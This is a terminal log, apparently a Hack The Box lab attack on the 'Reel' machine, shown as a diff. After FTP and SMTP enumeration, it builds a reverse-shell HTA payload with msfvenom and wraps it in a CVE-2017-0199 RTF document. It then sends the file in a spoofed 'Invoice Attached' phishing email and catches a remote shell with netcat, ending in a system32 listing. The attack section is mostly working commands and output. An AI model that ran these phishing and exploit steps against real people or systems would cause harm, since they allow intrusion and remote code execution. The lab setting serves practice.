@@ -1,0 +1,2915 @@
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# cat nmap    
+# Nmap 7.93 scan initiated Mon Mar 20 10:59:19 2023 as: nmap -sC -sV -A -p- -Pn --min-rate 15000 -o nmap 10.129.241.121
+Nmap scan report for reel (10.129.241.121)
+Host is up (0.26s latency).
+Not shown: 65529 filtered tcp ports (no-response)
+PORT    STATE SERVICE    VERSION
+21/tcp  open  tcpwrapped
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_05-28-18  11:19PM       <DIR>          documents
+22/tcp  open  tcpwrapped
+| ssh-hostkey: 
+|   2048 8220c3bd16cba29c88871d6c1559eded (RSA)
+|   256 232bb80a8c1cf44d8d7e5e6458803345 (ECDSA)
+|_  256 ac8bde251db7d838389b9c16bff63fed (ED25519)
+25/tcp  open  tcpwrapped
+| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+135/tcp open  tcpwrapped
+139/tcp open  tcpwrapped
+445/tcp open  tcpwrapped Windows Server 2012 R2 Standard 9600 tcpwrapped
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: WAP|phone
+Running: Linux 2.4.X|2.6.X, Sony Ericsson embedded
+OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz
+OS details: Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phone
+Network Distance: 2 hops
+
+Host script results:
+|_clock-skew: mean: 1s, deviation: 2s, median: 0s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   302: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2023-03-20T14:59:52
+|_  start_date: 2023-03-20T14:58:09
+| smb-os-discovery: 
+|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
+|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
+|   Computer name: REEL
+|   NetBIOS computer name: REEL\x00
+|   Domain name: HTB.LOCAL
+|   Forest name: HTB.LOCAL
+|   FQDN: REEL.HTB.LOCAL
+|_  System time: 2023-03-20T14:59:53+00:00
+
+TRACEROUTE (using port 25/tcp)
+HOP RTT        ADDRESS
+1   5067.68 ms 10.10.14.1
+2   5068.01 ms reel (10.129.241.121)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Mar 20 11:00:32 2023 -- 1 IP address (1 host up) scanned in 72.61 seconds
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# ftp 10.129.241.121                                                                                                         
+Connected to 10.129.241.121.
+220 Microsoft FTP Service
+Name (10.129.241.121:hackervegas001): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> ls
+229 Entering Extended Passive Mode (|||41001|)
+125 Data connection already open; Transfer starting.
+05-28-18  11:19PM       <DIR>          documents
+226 Transfer complete.
+ftp> ls -la
+229 Entering Extended Passive Mode (|||41002|)
+125 Data connection already open; Transfer starting.
+05-28-18  11:19PM       <DIR>          documents
+226 Transfer complete.
+ftp> cd documents
+250 CWD command successful.
+ftp> ls -la
+229 Entering Extended Passive Mode (|||41004|)
+125 Data connection already open; Transfer starting.
+05-28-18  11:19PM                 2047 AppLocker.docx
+05-28-18  01:01PM                  124 readme.txt
+10-31-17  09:13PM                14581 Windows Event Forwarding.docx
+226 Transfer complete.
+ftp> get AppLocker.docx
+local: AppLocker.docx remote: AppLocker.docx
+229 Entering Extended Passive Mode (|||41006|)
+150 Opening ASCII mode data connection.
+100% |***********************************************************************************************************************************************************************************************|  2047        8.54 KiB/s    00:00 ETA
+226 Transfer complete.
+WARNING! 9 bare linefeeds received in ASCII mode.
+File may not have transferred correctly.
+2047 bytes received in 00:00 (8.49 KiB/s)
+ftp> get readme.txt
+local: readme.txt remote: readme.txt
+229 Entering Extended Passive Mode (|||41007|)
+125 Data connection already open; Transfer starting.
+100% |***********************************************************************************************************************************************************************************************|   124        0.45 KiB/s    00:00 ETA
+226 Transfer complete.
+124 bytes received in 00:00 (0.45 KiB/s)
+ftp> get Windows\ Event\ Forwarding.docx
+local: Windows Event Forwarding.docx remote: Windows Event Forwarding.docx
+229 Entering Extended Passive Mode (|||41008|)
+125 Data connection already open; Transfer starting.
+100% |***********************************************************************************************************************************************************************************************| 14581       30.98 KiB/s    00:00 ETA
+226 Transfer complete.
+WARNING! 51 bare linefeeds received in ASCII mode.
+File may not have transferred correctly.
+14581 bytes received in 00:00 (30.33 KiB/s)
+ftp> put ip
+local: ip remote: ip
+229 Entering Extended Passive Mode (|||41009|)
+550 Access is denied. 
+ftp> exit
+221 Goodbye.
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# ls
+ AppLocker.docx   ip   nmap   readme.txt  'Windows Event Forwarding.docx'
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# file AppLocker.docx                    
+AppLocker.docx: Microsoft Word 2007+
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# file readme.txt    
+readme.txt: ASCII text
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# file Windows\ Event\ Forwarding.docx 
+Windows Event Forwarding.docx: Microsoft Word 2007+
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# cat readme.txt      
+please email me any rtf format procedures - I'll review and convert.
+
+new format / converted documents will be saved here.                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# exiftool AppLocker.docx 
+ExifTool Version Number         : 12.57
+File Name                       : AppLocker.docx
+Directory                       : .
+File Size                       : 2.0 kB
+File Modification Date/Time     : 2018:05:28 19:19:48-04:00
+File Access Date/Time           : 2023:03:20 11:02:29-04:00
+File Inode Change Date/Time     : 2023:03:20 11:02:29-04:00
+File Permissions                : -rw-r--r--
+File Type                       : DOCX
+File Type Extension             : docx
+MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
+Zip Required Version            : 20
+Zip Bit Flag                    : 0x0008
+Zip Compression                 : Deflated
+Zip Modify Date                 : 2018:05:29 00:19:50
+Zip CRC                         : 0x3cdd8b4f
+Zip Compressed Size             : 166
+Zip Uncompressed Size           : 284
+Zip File Name                   : _rels/.rels
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# exiftool readme.txt    
+ExifTool Version Number         : 12.57
+File Name                       : readme.txt
+Directory                       : .
+File Size                       : 122 bytes
+File Modification Date/Time     : 2018:05:28 09:01:17-04:00
+File Access Date/Time           : 2023:03:20 11:02:33-04:00
+File Inode Change Date/Time     : 2023:03:20 11:02:33-04:00
+File Permissions                : -rw-r--r--
+File Type                       : TXT
+File Type Extension             : txt
+MIME Type                       : text/plain
+MIME Encoding                   : us-ascii
+Newlines                        : Unix LF
+Line Count                      : 3
+Word Count                      : 21
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# exiftool Windows\ Event\ Forwarding.docx 
+ExifTool Version Number         : 12.57
+File Name                       : Windows Event Forwarding.docx
+Directory                       : .
+File Size                       : 15 kB
+File Modification Date/Time     : 2017:10:31 17:13:23-04:00
+File Access Date/Time           : 2023:03:20 11:02:40-04:00
+File Inode Change Date/Time     : 2023:03:20 11:02:40-04:00
+File Permissions                : -rw-r--r--
+File Type                       : DOCX
+File Type Extension             : docx
+MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
+Zip Required Version            : 20
+Zip Bit Flag                    : 0x0006
+Zip Compression                 : Deflated
+Zip Modify Date                 : 1980:01:01 00:00:00
+Zip CRC                         : 0x82872409
+Zip Compressed Size             : 385
+Zip Uncompressed Size           : 1422
+Zip File Name                   : [Content_Types].xml
+Creator                         : nico@megabank.com
+Revision Number                 : 4
+Create Date                     : 2017:10:31 18:42:00Z
+Modify Date                     : 2017:10:31 18:51:00Z
+Template                        : Normal.dotm
+Total Edit Time                 : 5 minutes
+Pages                           : 2
+Words                           : 299
+Characters                      : 1709
+Application                     : Microsoft Office Word
+Doc Security                    : None
+Lines                           : 14
+Paragraphs                      : 4
+Scale Crop                      : No
+Heading Pairs                   : Title, 1
+Titles Of Parts                 : 
+Company                         : 
+Links Up To Date                : No
+Characters With Spaces          : 2004
+Shared Doc                      : No
+Hyperlinks Changed              : No
+App Version                     : 14.0000
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# telnet 10.129.241.121 25
+Trying 10.129.241.121...
+Connected to 10.129.241.121.
+Escape character is '^]'.
+220 Mail Service ready
+HELLO miko.htb
+503 Bad sequence of commands
+HELO m1c0.htb
+250 Hello.
+MAIL FROM <m1kU@htb.gg>
+550 Invalid syntax. Syntax should be MAIL FROM:<mailbox@domain>[crlf]
+MAIL FROM: <m1kU@htb.gg>
+250 OK
+RCPT TO: <nico@megabank.com>
+250 OK
+RCPT TO:<m1ku@megabank.com>
+550 Unknown user
+exit
+503 Bad sequence of commands
+^C
+^C^C^Cbye
+exit
+
+
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# nano test-users.txt
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# cat test-users.txt 
+reel
+administrator
+admin
+root
+reel@htb
+reel@htb.local
+reel@reel.htb
+administrator@htb
+admin@htb
+root@htb
+sadfasdfasdfasdf@htb
+nico@megabank.com
+0xdf@megabank.com
+htb@metabank.com
+                                                   
+
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# smtp-user-enum -M RCPT -U test-users.txt -t 10.129.241.121
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 5
+Usernames file ........... test-users.txt
+Target count ............. 1
+Username count ........... 14
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ 
+
+######## Scan started at Mon Mar 20 11:21:32 2023 #########
+10.129.241.121: reel@htb exists
+10.129.241.121: reel@htb.local exists
+10.129.241.121: reel@reel.htb exists
+10.129.241.121: administrator@htb exists
+10.129.241.121: admin@htb exists
+10.129.241.121: root@htb exists
+10.129.241.121: sadfasdfasdfasdf@htb exists
+10.129.241.121: htb@metabank.com exists
+10.129.241.121: nico@megabank.com exists
+######## Scan completed at Mon Mar 20 11:21:36 2023 #########
+9 results.
+
+14 queries in 4 seconds (3.5 queries / sec)
+
+
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.117 LPORT=443 -f hta-psh -o msfv.hta
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of hta-psh file: 7378 bytes
+Saved as: msfv.hta
+                                  
+
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# git clone https://github.com/bhdresh/CVE-2017-0199.git                                             
+Cloning into 'CVE-2017-0199'...
+remote: Enumerating objects: 298, done.
+remote: Total 298 (delta 0), reused 0 (delta 0), pack-reused 298
+Receiving objects: 100% (298/298), 288.09 KiB | 112.00 KiB/s, done.
+Resolving deltas: 100% (102/102), done.
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# ls
+ AppLocker.docx   CVE-2017-0199   ip   msfv.hta   nmap   readme.txt   test-users.txt  'Windows Event Forwarding.docx'
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# cd CVE-2017-0199 
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/htb/active-directory-101/reel/CVE-2017-0199]
+└─# ls
+cve-2017-0199_toolkit.py  README.md  template  TODO.txt
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/htb/active-directory-101/reel/CVE-2017-0199]
+└─# cd ..           
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# ls
+ AppLocker.docx   CVE-2017-0199   ip   msfv.hta   nmap   readme.txt   test-users.txt  'Windows Event Forwarding.docx'
+                                                                                                                      
+
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# python2  CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w invoice.rtf -u http://10.10.14.117/msfv.hta -t rtf -x 0
+Generating normal RTF payload.
+
+Generated invoice.rtf successfully
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# ls
+ AppLocker.docx   CVE-2017-0199   invoice.rtf   ip   msfv.hta   nmap   readme.txt   test-users.txt  'Windows Event Forwarding.docx'
+                                                                                                                                                                                                                                            
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# cat ip                                                                                                                                 
+10.129.241.121
+
+
+
+
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# sendEmail -f 0xdf@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "You are overdue payment" -a invoice.rtf -s 10.129.241.121 -v
+Mar 20 11:30:40 verma sendEmail[64851]: DEBUG => Connecting to 10.129.241.121:25
+Mar 20 11:30:41 verma sendEmail[64851]: DEBUG => My IP address is: 10.10.14.117
+Mar 20 11:30:41 verma sendEmail[64851]: SUCCESS => Received:    220 Mail Service ready
+Mar 20 11:30:41 verma sendEmail[64851]: INFO => Sending:        EHLO verma.verma.local
+Mar 20 11:30:41 verma sendEmail[64851]: SUCCESS => Received:    250-REEL, 250-SIZE 20480000, 250-AUTH LOGIN PLAIN, 250 HELP
+Mar 20 11:30:41 verma sendEmail[64851]: INFO => Sending:        MAIL FROM:<0xdf@megabank.com>
+Mar 20 11:30:41 verma sendEmail[64851]: SUCCESS => Received:    250 OK
+Mar 20 11:30:41 verma sendEmail[64851]: INFO => Sending:        RCPT TO:<nico@megabank.com>
+Mar 20 11:30:41 verma sendEmail[64851]: SUCCESS => Received:    250 OK
+Mar 20 11:30:41 verma sendEmail[64851]: INFO => Sending:        DATA
+Mar 20 11:30:42 verma sendEmail[64851]: SUCCESS => Received:    354 OK, send.
+Mar 20 11:30:42 verma sendEmail[64851]: INFO => Sending message body
+Mar 20 11:30:42 verma sendEmail[64851]: Setting content-type: text/plain
+Mar 20 11:30:42 verma sendEmail[64851]: DEBUG => Sending the attachment [invoice.rtf]
+Mar 20 11:30:53 verma sendEmail[64851]: SUCCESS => Received:    250 Queued (11.484 seconds)
+Mar 20 11:30:53 verma sendEmail[64851]: Email was sent successfully!  From: <0xdf@megabank.com> To: <nico@megabank.com> Subject: [Invoice Attached] Attachment(s): [invoice.rtf] Server: [10.129.241.121:25]
+
+
+# now start your python server and listing to got a reverse shell :)  
+
+┌──(root㉿verma)-[/home/…/Desktop/htb/active-directory-101/reel]
+└─# nc -nlvp 443     
+listening on [any] 443 ...
+connect to [10.10.14.117] from (UNKNOWN) [10.129.241.121] 53970
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is CEBA-B613
+
+ Directory of C:\Windows\system32
+
+20/03/2023  15:31    <DIR>          .
+20/03/2023  15:31    <DIR>          ..
+22/08/2013  16:05    <DIR>          0409
+18/06/2013  12:19             2,151 12520437.cpx
+18/06/2013  12:19             2,233 12520850.cpx
+18/06/2013  12:22               160 @OpenWithToastLogo.png
+18/06/2013  12:36               120 @TileEmpty1x1Image.png
+29/10/2014  01:26         3,788,288 accessibilitycpl.dll
+22/08/2013  04:16            39,424 ACCTRES.dll
+29/10/2014  01:58             8,704 acledit.dll
+29/10/2014  01:24           902,144 aclui.dll
+29/10/2014  01:32            46,592 acppage.dll
+29/10/2014  01:22           839,680 ActionCenter.dll
+29/10/2014  01:29           528,896 ActionCenterCPL.dll
+29/10/2014  00:45           225,792 activeds.dll
+22/08/2013  04:16           111,616 activeds.tlb
+27/08/2016  16:11         1,049,600 actxprxy.dll
+29/10/2014  01:29           464,384 AdmTmpl.dll
+29/10/2014  01:49            51,200 admwprox.dll
+06/03/2014  07:04           823,808 adprop.dll
+29/10/2014  01:43            49,664 adprovider.dll
+24/10/2017  20:27           643,584 adsiedit.dll
+24/10/2017  20:27           144,380 adsiedit.msc
+29/10/2014  01:52           224,768 adsldp.dll
+29/10/2014  01:57           219,136 adsldpc.dll
+17/09/2016  17:21            89,600 adsmsext.dll
+29/10/2014  01:46           292,352 adsnt.dll
+21/01/2017  18:40           756,736 adtschema.dll
+22/08/2013  15:39    <DIR>          AdvancedInstallers
+08/09/2017  03:28           507,176 advapi32.dll
+22/08/2013  04:16             2,048 advapi32res.dll
+29/10/2014  01:42           112,640 advpack.dll
+22/08/2013  04:16            29,184 aeevts.dll
+29/10/2014  01:05            25,600 ahadmin.dll
+29/10/2014  01:49            80,384 amstream.dll
+29/10/2014  01:13           219,648 apds.dll
+22/08/2015  13:42            12,640 api-ms-win-crt-conio-l1-1-0.dll
+22/08/2015  13:42            15,712 api-ms-win-crt-convert-l1-1-0.dll
+22/08/2015  13:42            12,128 api-ms-win-crt-environment-l1-1-0.dll
+22/08/2015  13:42            13,664 api-ms-win-crt-filesystem-l1-1-0.dll
+22/08/2015  13:42            12,640 api-ms-win-crt-heap-l1-1-0.dll
+22/08/2015  13:42            12,128 api-ms-win-crt-locale-l1-1-0.dll
+22/08/2015  13:42            22,368 api-ms-win-crt-math-l1-1-0.dll
+22/08/2015  13:42            19,808 api-ms-win-crt-multibyte-l1-1-0.dll
+22/08/2015  13:42            66,400 api-ms-win-crt-private-l1-1-0.dll
+22/08/2015  13:42            12,640 api-ms-win-crt-process-l1-1-0.dll
+22/08/2015  13:42            16,224 api-ms-win-crt-runtime-l1-1-0.dll
+22/08/2015  13:42            17,760 api-ms-win-crt-stdio-l1-1-0.dll
+22/08/2015  13:42            17,760 api-ms-win-crt-string-l1-1-0.dll
+22/08/2015  13:42            14,176 api-ms-win-crt-time-l1-1-0.dll
+22/08/2015  13:42            12,128 api-ms-win-crt-utility-l1-1-0.dll
+29/10/2014  02:00           642,560 apphelp.dll
+29/10/2014  01:50            30,208 Apphlpdm.dll
+12/07/2017  20:25            66,112 appidapi.dll
+29/10/2014  01:32           226,304 AppIdPolicyEngineApi.dll
+22/08/2013  15:39    <DIR>          AppLocker
+29/10/2014  01:48           155,648 appmgmts.dll
+29/10/2014  01:12           371,712 appmgr.dll
+29/10/2014  01:24           133,632 apprepapi.dll
+29/10/2014  01:17           114,688 apprepsync.dll
+29/10/2014  01:19           701,440 appwiz.cpl
+29/10/2014  01:02           143,360 AppxAllUserStore.dll
+29/10/2014  00:59           420,864 AppxApplicabilityEngine.dll
+29/10/2014  00:58           214,016 AppXDeploymentClient.dll
+29/10/2014  00:42           497,664 AppxPackaging.dll
+18/06/2013  12:21               630 AppxProvisioning.xml
+29/10/2014  01:00            98,304 AppxSip.dll
+22/08/2013  15:39    <DIR>          ar-SA
+29/10/2014  01:04            22,016 ARP.EXE
+10/08/2013  00:56            28,264 aspnet_counters.dll
+04/03/2017  18:15            77,824 asycfilt.dll
+29/10/2014  01:51            24,064 at.exe
+29/10/2014  01:43            42,496 AtBroker.exe
+29/10/2014  01:51            87,552 atl.dll
+14/12/2017  18:43            84,992 atl70.dll
+30/01/2015  01:29            35,840 atlthunk.dll
+14/05/2017  19:04           315,224 atmfd.dll
+12/05/2017  17:05            35,840 atmlib.dll
+29/10/2014  01:05            18,432 attrib.exe
+29/10/2014  03:07           424,544 AudioEng.dll
+29/10/2014  03:07           344,536 AUDIOKSE.dll
+29/10/2014  03:07           370,424 AudioSes.dll
+29/10/2014  01:39           219,648 AuditNativeSnapIn.dll
+29/10/2014  01:04            52,224 auditpol.exe
+29/10/2014  01:48            57,856 AuditPolicyGPInterop.dll
+21/01/2017  18:40            95,232 auditpolmsg.dll
+29/10/2014  00:34           104,448 AuthBroker.dll
+29/10/2014  01:20            31,232 AuthExt.dll
+29/10/2014  00:57           364,032 authfwcfg.dll
+29/10/2014  01:39           299,520 AuthFWGP.dll
+29/10/2014  03:07         5,120,000 AuthFWSnapin.dll
+29/10/2014  03:07           114,176 AuthFWWizFwk.dll
+11/08/2017  01:30         2,464,256 authui.dll
+11/08/2017  01:57           180,224 authz.dll
+22/02/2014  11:24           792,576 autochk.exe
+06/06/2017  19:03           837,632 autoconv.exe
+22/02/2014  11:24           780,288 autofmt.exe
+29/10/2014  01:30           139,776 autoplay.dll
+29/10/2014  01:54            66,560 avicap32.dll
+29/10/2014  01:50            96,256 avifil32.dll
+29/10/2014  03:11            31,496 avrt.dll
+18/06/2013  12:23            41,587 azman.msc
+29/10/2014  01:32           794,624 azroles.dll
+29/10/2014  01:25           336,896 azroleui.dll
+29/10/2014  01:53            27,136 AzSqlExt.dll
+29/10/2014  01:05             8,704 backgroundTaskHost.exe
+29/10/2014  01:00            29,184 BackgroundTransferHost.exe
+13/08/2017  17:52           174,944 basecsp.dll
+29/10/2014  01:59         2,013,696 batmeter.dll
+29/10/2014  03:06            80,016 bcd.dll
+29/10/2014  01:04           296,448 BCP47Langs.dll
+19/11/2016  17:22           111,104 bcrypt.dll
+18/05/2016  22:28           340,880 bcryptprimitives.dll
+25/10/2017  20:48    <DIR>          BestPractices
+22/08/2013  15:39    <DIR>          bg-BG
+29/10/2014  01:45            39,424 bidispl.dll
+29/10/2014  01:39           197,120 bitsadmin.exe
+29/10/2014  01:05            19,968 bitsperf.dll
+29/10/2014  01:53            11,776 bitsprx2.dll
+29/10/2014  01:56            11,264 bitsprx3.dll
+29/10/2014  01:56            10,752 bitsprx4.dll
+29/10/2014  01:56            19,968 bitsprx5.dll
+29/10/2014  01:56            11,776 bitsprx6.dll
+29/10/2014  01:56            11,264 bitsprx7.dll
+29/10/2014  01:00           108,544 biwinrt.dll
+18/06/2013  12:43         3,170,304 boot.sdi
+29/10/2014  01:47            78,336 bootcfg.exe
+22/08/2013  05:25            23,904 BOOTVID.DLL
+29/10/2014  01:04            44,544 browcli.dll
+29/10/2014  02:00            11,776 browseui.dll
+29/10/2014  01:34            46,080 BWContextHandler.dll
+29/10/2014  00:46            28,672 ByteCodeGenerator.exe
+29/10/2014  03:18           120,352 cabinet.dll
+29/10/2014  01:37           132,608 cabview.dll
+29/10/2014  01:04            27,136 cacls.exe
+29/10/2014  01:33           816,128 calc.exe
+29/10/2014  01:04            76,288 CallButtons.dll
+29/10/2014  01:00            12,800 CallButtons.ProxyStub.dll
+29/10/2014  01:43            53,760 capiprovider.dll
+29/10/2014  01:56            18,432 capisp.dll
+22/08/2013  15:39    <DIR>          catroot
+29/10/2014  00:39           401,408 catsrv.dll
+29/10/2014  01:00            24,576 catsrvps.dll
+21/11/2015  16:40           414,208 catsrvut.dll
+05/03/2016  18:14            24,064 cbclient.dll
+29/10/2014  01:14           854,528 cdosys.dll
+30/05/2014  03:05           402,432 certadm.dll
+29/10/2014  00:49           831,488 certca.dll
+14/10/2017  06:41           324,096 certcli.dll
+29/10/2014  00:56           337,920 certCredProvider.dll
+18/05/2016  21:15            44,032 certenc.dll
+29/10/2014  00:50         2,317,824 CertEnroll.dll
+29/10/2014  00:50            41,472 CertEnrollCtrl.exe
+29/10/2014  01:12           284,672 CertEnrollUI.dll
+18/06/2013  12:37            63,081 certlm.msc
+29/10/2014  01:18         1,984,000 certmgr.dll
+18/06/2013  12:37            63,070 certmgr.msc
+22/08/2013  02:57           620,032 certocm.dll
+22/08/2013  03:19            19,456 certpick.dll
+29/10/2014  01:52            68,608 CertPolEng.dll
+29/10/2014  01:25           316,416 certreq.exe
+28/04/2017  01:11         1,060,352 certutil.exe
+10/01/2016  17:14            48,640 cfgbkend.dll
+29/10/2014  03:18           241,168 cfgmgr32.dll
+29/10/2014  01:58            14,848 change.exe
+29/10/2014  01:53           109,056 chartv.dll
+29/10/2014  01:58            12,288 chcp.com
+29/10/2014  00:44            24,576 CheckNetIsolation.exe
+29/10/2014  01:56            18,944 chglogon.exe
+29/10/2014  01:58            20,992 chgport.exe
+29/10/2014  01:58            19,456 chgusr.exe
+29/10/2014  01:03            22,016 chkdsk.exe
+29/10/2014  01:58            18,944 chkntfs.exe
+29/10/2014  01:48            28,160 choice.exe
+29/10/2014  01:49            10,240 CHxReadingStringIME.dll
+29/10/2014  01:53           163,328 cic.dll
+29/10/2014  01:45            38,912 cipher.exe
+29/10/2014  01:59            14,848 clb.dll
+29/10/2014  03:10           569,128 clbcatq.dll
+04/03/2015  02:19            58,880 clfsw32.dll
+29/10/2014  01:57            77,824 cliconfg.dll
+29/10/2014  01:58            28,672 cliconfg.exe
+22/08/2013  04:17            36,864 cliconfg.rll
+29/10/2014  01:51            24,064 clip.exe
+22/02/2014  11:16            12,288 clrhost.dll
+29/10/2014  01:28           320,512 clusapi.dll
+29/10/2014  01:44            33,792 cmcfg32.dll
+29/10/2014  01:05           315,392 cmd.exe
+29/10/2014  01:52            10,240 cmdext.dll
+29/10/2014  01:30           484,352 cmdial32.dll
+29/10/2014  01:58            14,848 cmdkey.exe
+29/10/2014  01:48            48,128 cmdl32.exe
+29/10/2014  00:57            80,384 cmifw.dll
+22/08/2013  13:25           189,440 cmipnpinstall.dll
+29/10/2014  01:38            35,840 cmlua.dll
+29/10/2014  01:58            38,912 cmmon32.exe
+29/10/2014  01:59            25,088 cmpbk32.dll
+29/10/2014  01:38            84,480 cmstp.exe
+29/10/2014  01:38            16,896 cmstplua.dll
+29/10/2014  01:52            47,104 cmutil.dll
+29/10/2014  01:00           101,376 cngcredui.dll
+29/10/2014  01:43            56,320 cngprovider.dll
+06/06/2017  18:59            34,816 cnvfat.dll
+29/10/2014  00:59            70,144 colbact.dll
+29/10/2014  01:58            86,016 colorcpl.exe
+29/10/2014  01:30           605,696 colorui.dll
+21/01/2018  23:26    <DIR>          Com
+16/04/2017  09:07         1,566,032 combase.dll
+29/10/2014  01:59             8,192 comcat.dll
+25/04/2015  02:33           549,888 comctl32.dll
+29/10/2014  01:14           609,280 comdlg32.dll
+18/06/2013  12:20           124,118 comexp.msc
+29/10/2014  01:59            23,040 comp.exe
+29/10/2014  01:52            18,944 compact.exe
+18/06/2013  12:23           113,256 compmgmt.msc
+22/08/2013  01:42             8,960 compobj.dll
+29/10/2014  03:07            18,040 CompPkgSup.dll
+29/10/2014  01:52           289,280 compstui.dll
+29/10/2014  01:39            36,352 ComputerDefaults.exe
+29/10/2014  00:59            98,304 comrepl.dll
+22/08/2013  04:14         1,297,408 comres.dll
+29/10/2014  01:37           236,032 comsnap.dll
+21/11/2015  16:49         1,344,000 comsvcs.dll
+29/10/2014  01:32           654,848 comuid.dll
+22/08/2013  15:39    <DIR>          config
+29/10/2014  00:46            52,224 ConfigureExpandedStorage.dll
+29/10/2014  01:17         1,296,896 connect.dll
+29/10/2014  01:35            40,960 ConnectedAccountState.dll
+18/06/2013  12:31               543 connectedsearch-appcmd.searchconnector-ms
+03/08/2013  04:39               528 connectedsearch-contacts.searchconnector-ms
+18/06/2013  12:31               539 connectedsearch-history.searchconnector-ms
+18/06/2013  12:31               525 connectedsearch-music.searchconnector-ms
+18/06/2013  12:31               522 connectedsearch-paths.searchconnector-ms
+18/06/2013  12:31               530 connectedsearch-protocol.searchconnector-ms
+01/02/2014  06:00            11,109 connectedsearch-results.searchconnector-ms
+01/02/2014  06:00             7,762 connectedsearch-suggestions.searchconnector-ms
+01/02/2014  06:00             7,130 connectedsearch-zeroinput.searchconnector-ms
+29/10/2014  01:47            73,728 console.dll
+29/10/2014  01:39           114,176 control.exe
+29/10/2014  01:58            18,432 convert.exe
+22/08/2013  04:16            15,360 CoreMmRes.dll
+25/10/2017  20:47            34,304 CPrepSrv.dll
+29/10/2014  03:10            34,016 CredentialUIBroker.exe
+29/10/2014  01:04            18,944 credssp.dll
+29/10/2014  01:29           140,288 credui.dll
+29/10/2014  01:31            29,696 credwiz.exe
+18/06/2013  12:38           149,019 crtdll.dll
+31/03/2017  21:59         1,612,504 crypt32.dll
+29/10/2014  03:05            30,984 cryptbase.dll
+29/10/2014  01:57            25,600 cryptdlg.dll
+29/10/2014  03:15            74,352 cryptdll.dll
+29/10/2014  01:34            57,856 cryptext.dll
+29/10/2014  01:05           137,728 cryptnet.dll
+29/10/2014  01:00           166,400 CryptoWinRT.dll
+29/10/2014  03:15            96,032 cryptsp.dll
+29/10/2014  01:03            31,232 crypttpmeksvc.dll
+29/10/2014  00:38           565,760 cryptui.dll
+29/10/2014  01:27           362,496 cryptuiwizard.dll
+29/10/2014  03:15            99,104 cryptxml.dll
